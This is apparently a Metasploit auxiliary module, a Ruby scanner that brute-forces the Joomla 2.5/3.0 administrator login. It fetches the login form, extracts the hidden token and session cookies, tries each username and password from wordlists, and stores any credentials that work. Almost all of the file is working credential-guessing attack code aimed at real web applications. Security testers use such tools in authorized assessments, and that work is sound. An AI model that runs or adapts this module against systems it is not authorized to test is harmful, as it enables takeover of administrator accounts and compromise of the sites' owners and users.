##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Joomla Bruteforce Login Utility',
      'Description'    => 'This module attempts to authenticate to Joomla 2.5. or 3.0 through bruteforce attacks',
      'Author'         => 'luisco100[at]gmail.com',
      'References'     =>
        [
          ['CVE', '1999-0502'] # Weak password Joomla
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        OptPath.new('USERPASS_FILE', [false, 'File containing users and passwords separated by space, one pair per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')]),
        OptPath.new('USER_FILE', [false, 'File containing users, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', "http_default_users.txt")]),
        OptPath.new('PASS_FILE', [false, 'File containing passwords, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')]),
        OptString.new('AUTH_URI', [true, 'The URI to authenticate against', '/administrator/index.php']),
        OptString.new('FORM_URI', [true, 'The FORM URI to authenticate against' , '/administrator']),
        OptString.new('USER_VARIABLE', [true, 'The name of the variable for the user field', 'username']),
        OptString.new('PASS_VARIABLE', [true, 'The name of the variable for the password field' , 'passwd']),
        OptString.new('WORD_ERROR', [true, 'The word of message for detect that login fail', 'mod-login-username'])
      ])

    register_autofilter_ports([80, 443])
  end

  def find_auth_uri
    if datastore['AUTH_URI'] && datastore['AUTH_URI'].length > 0
      paths = [datastore['AUTH_URI']]
    else
      paths = %w(
        /
        /administrator/
      )
    end

    paths.each do |path|
      begin
        res = send_request_cgi(
          'uri'    => path,
          'method' => 'GET'
        )
      rescue ::Rex::ConnectionError
        next
      end

      next unless res

      if res.redirect? && res.headers['Location'] && res.headers['Location'] !~ /^http/
        path = res.headers['Location']
        vprint_status("#{rhost}:#{rport} - Following redirect: #{path}")
        begin
          res = send_request_cgi(
            'uri'     => path,
            'method'  => 'GET'
          )
        rescue ::Rex::ConnectionError
          next
        end
        next unless res
      end

      return path
    end

    nil
  end

  def target_url
    proto = 'http'
    if rport == 443 || ssl
      proto = 'https'
    end
    "#{proto}://#{rhost}:#{rport}#{@uri}"
  end

  def run_host(ip)
    vprint_status("#{rhost}:#{rport} - Searching Joomla authentication URI...")
    @uri = find_auth_uri

    unless @uri
      vprint_error("#{rhost}:#{rport} - No URI found that asks for authentication")
      return
    end

    @uri = "/#{@uri}" if @uri[0, 1] != '/'

    vprint_status("#{target_url} - Attempting to login...")

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_login(user, pass)
    vprint_status("#{target_url} - Trying username:'#{user}' with password:'#{pass}'")
    response  = do_web_login(user, pass)
    result = determine_result(response)

    if result == :success
      print_good("#{target_url} - Successful login '#{user}' : '#{pass}'")
      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: response.inspect)
      return :abort if datastore['STOP_ON_SUCCESS']
      return :next_user
    else
      vprint_error("#{target_url} - Failed to login as '#{user}'")
      return
    end
  end

  def do_web_login(user, pass)
    user_var = datastore['USER_VARIABLE']
    pass_var = datastore['PASS_VARIABLE']

    referer_var = "http://#{rhost}/administrator/index.php"

    vprint_status("#{target_url} - Searching Joomla Login Response...")
    res = login_response

    unless res && res.code = 200 && !res.get_cookies.blank?
      vprint_error("#{target_url} - Failed to find Joomla Login Response")
      return nil
    end

    vprint_status("#{target_url} - Searching Joomla Login Form...")
    hidden_value = get_login_hidden(res)
    if hidden_value.nil?
      vprint_error("#{target_url} - Failed to find Joomla Login Form")
      return nil
    end

    vprint_status("#{target_url} - Searching Joomla Login Cookies...")
    cookie = get_login_cookie(res)
    if cookie.blank?
      vprint_error("#{target_url} - Failed to find Joomla Login Cookies")
      return nil
    end

    vprint_status("#{target_url} - Login with cookie ( #{cookie} ) and Hidden ( #{hidden_value}=1 )")
    res = send_request_login(
      'user_var'     => user_var,
      'pass_var'     => pass_var,
      'cookie'       => cookie,
      'referer_var'  => referer_var,
      'user'         => user,
      'pass'         => pass,
      'hidden_value' => hidden_value
    )

    if res
      vprint_status("#{target_url} - Login Response #{res.code}")
      if res.redirect? && res.headers['Location']
        path = res.headers['Location']
        vprint_status("#{target_url} - Following redirect to #{path}...")

        res = send_request_raw(
          'uri'     => path,
          'method'  => 'GET',
          'cookie' => "#{cookie}"
        )
      end
    end

    return res
    rescue ::Rex::ConnectionError
      vprint_error("#{target_url} - Failed to connect to the web server")
      return nil
  end

  def send_request_login(opts = {})
    res = send_request_cgi(
      'uri'     => @uri,
      'method'  => 'POST',
      'cookie'  => "#{opts['cookie']}",
      'headers' =>
        {
          'Referer' => opts['referer_var']
        },
      'vars_post' => {
        opts['user_var']     => opts['user'],
        opts['pass_var']     => opts['pass'],
        'lang'               => '',
        'option'             => 'com_login',
        'task'               => 'login',
        'return'             => 'aW5kZXgucGhw',
        opts['hidden_value'] => 1
      }
    )

    res
  end

  def determine_result(response)
    return :abort unless response.kind_of?(Rex::Proto::Http::Response)
    return :abort unless response.code

    if [200, 301, 302].include?(response.code)
      if response.to_s.include?(datastore['WORD_ERROR'])
        return :fail
      else
        return :success
      end
    end

    :fail
  end

  def login_response
    uri = normalize_uri(datastore['FORM_URI'])
    res = send_request_cgi!('uri' => uri, 'method' => 'GET')

    res
  end

  def get_login_cookie(res)
    return nil unless res.kind_of?(Rex::Proto::Http::Response)

    res.get_cookies
  end

  def get_login_hidden(res)
    return nil unless res.kind_of?(Rex::Proto::Http::Response)

    return nil if res.body.blank?

    vprint_status("#{target_url} - Testing Joomla 2.5 Form...")
    form = res.body.split(/<form action=([^\>]+) method="post" id="form-login"\>(.*)<\/form>/mi)

    if form.length == 1  # is not Joomla 2.5
      vprint_status("#{target_url} - Testing Form Joomla 3.0 Form...")
      form = res.body.split(/<form action=([^\>]+) method="post" id="form-login" class="form-inline"\>(.*)<\/form>/mi)
    end

    if form.length == 1 # is not Joomla 3
      vprint_error("#{target_url} - Last chance to find a login form...")
      form = res.body.split(/<form id="login-form" action=([^\>]+)\>(.*)<\/form>/mi)
    end

    begin
      input_hidden = form[2].split(/<input type="hidden"([^\>]+)\/>/mi)
      input_id = input_hidden[7].split("\"")
    rescue NoMethodError
      return nil
    end

    valor_input_id = input_id[1]

    valor_input_id
  end
end
